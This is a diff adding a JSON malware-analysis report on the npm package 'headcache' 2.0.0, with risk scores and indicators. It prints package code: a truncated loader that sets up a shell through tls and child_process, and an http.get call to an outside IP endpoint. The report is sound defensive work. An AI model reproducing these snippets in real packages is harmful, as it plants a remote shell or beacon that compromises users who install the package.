@@ -1,0 +1,44 @@
+{
+  "package_metadata": {
+    "name": "headcache",
+    "version": "2.0.0"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_activity": [
+      {
+        "location": "package/index.js:2",
+        "activity": "Outbound network request to suspicious domain http://45.63.54.27:8080/event_recv"
+      }
+    ],
+    "process_actions": [
+      {
+        "location": "package/index.js:4",
+        "action": "Potential DLL hijacking attempt via child_process and dynamic require"
+      }
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "package/index.js",
+        "code_snippet": "(function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"tls\"), cp = require(\"child_process\"),...);  })();\n"
+      },
+      {
+        "filename": "package/index.js",
+        "code_snippet": "http.get('http://45.63.54.27:8080/event_recv', function() {});\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.85,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "indicators": [
+      "Potential DLL hijacking detected",
+      "Network call to suspicious IP address",
+      "High entropy code with obfuscated logic",
+      "Unusual outbound communication pattern"
+    ]
+  }
+}
